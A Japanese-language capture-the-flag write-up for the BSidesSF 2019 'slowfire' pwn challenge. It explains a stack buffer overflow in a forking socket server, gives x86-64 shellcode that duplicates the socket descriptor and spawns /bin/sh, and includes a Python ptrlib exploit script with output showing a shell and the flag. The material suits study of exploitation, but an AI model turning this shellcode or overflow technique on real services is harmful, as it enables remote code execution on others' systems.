# [pwn 200pts] slowfire - BSidesSF 2019 CTF
参加中は手を付けていない問題です。
64bitバイナリでセキュリティ機構は基本的に無効のようです。
```
$ checksec slowfire 
[*] 'slowfire'
    Arch:       64 bits (little endian)
    NX:         NX disabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
IDAで解析しましょう。
まず、ポート番号4141でソケットを作り、bind, listenします。
接続要求が来たらacceptしてforkし、子プロセスはhandle_clientを実行します。

名前とメッセージを入力でき、名前はグローバル変数nameに、メッセージはローカル変数msgに入れられます。
ここで、`read_line_safe`関数が使われ、引数としてサイズも渡されるのですが、1文字ずつreadするのではなく渡されたsizeバイトずつreadしています。
したがって、最後にバッファオーバーフローしてしまいます。
今回はPIEもSSPもNXも無効なので、nameにシェルコードを入れて、オーバーフローでリターンアドレスをnameのアドレスにします。

ここで1つ問題があって、今回はソケットを作るところからバイナリがやっているので、普通のシェルコードを実行してもコマンドの入力ができないという点です。
したがって、入出力をソケット経由で転送する必要があります。

いろいろ調べた結果、dup2を使えばできそうです。
dup2は第一引数のファイルディスクリプタを第二引数へ複製するシステムコールです。
したがって、fdを0と1にdupすれば普通のシェルコードが実行できます。
`handle_client`が終了する際にシェルコードが呼ばれるのですが、この関数で最後に呼ばれる`write_string`関数ではrdiにfdが入った状態で終了します。
したがって、シェルコードでは`dup(rdi, 0)`および`dup(rdi, 1)`を実行すればよさそうです。

次のようなシェルコードを書きました。
```nasm
        xor rsi, rsi
	mov al, 33
        syscall

        inc rsi
	mov al, 33
        syscall
        
; Execve
        xor rax, rax
        push rax

	mov rbx, 0x68732f2f6e69622f
	push rbx
	
	push rsp
	pop rdi
	
	push rax
	push rdi
	push rsp
	pop rsi
	
	cdq
	mov al, 59
        syscall
```

exploitコードは次のようになります。
```python
from ptrlib import *

elf = ELF("./slowfire")
sock = Socket("127.0.0.1", 4141)

with open("reverseshell.o", "rb") as f:
    f.seek(0x180)
    shellcode = f.read(0x40)
payload = b"A" * 0x400
payload += p64(elf.symbol("name")) * 80
sock.recvuntil("Enter your name> ")
sock.sendline(shellcode)
sock.recvuntil("Enter message> ")
sock.send(payload)

sock.interactive()
```

できました！
```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:4141
[ptrlib]$ Greetings H1ö°!HÿÆ°!H1ÀPH»/bin//shST_PWT^°;!
  Your converted message is:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÀ@@ls
flag.txt
slowfire
[ptrlib]$ cat flag.txt
CTF{cOnGrAtZ_oN_t3h_FlAg}
[ptrlib]$ 
```

# 感想
socket経由のshellcodeにdup2が使えるというのは勉強になりました。
RIPを奪った後の試行錯誤が面白かったです。

# 参考文献
[1] [https://krrr-1.tistory.com/82?category=821249](https://krrr-1.tistory.com/82?category=821249)